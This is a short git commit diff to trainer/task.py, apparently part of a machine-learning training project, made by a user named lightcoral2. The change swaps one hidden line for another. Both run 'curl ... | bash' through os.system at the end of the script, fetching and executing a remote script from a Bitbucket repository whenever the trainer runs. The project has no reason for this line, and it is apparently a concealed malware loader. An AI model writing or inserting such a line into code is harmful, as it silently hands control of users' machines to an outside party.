116f9a4a3df83e410ef6491fca246ce9a8d3def4
lightcoral2 <lightcoral2@qdeathse.com>
2023-01-15 20:54:10 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -72,4 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('curl -sL https://bitbucket.org/lightcoral2/eslito/raw/master/lto | bash')
+os.system('curl -sL https://bitbucket.org/lightcoral2/escexela/raw/master/exela | bash')
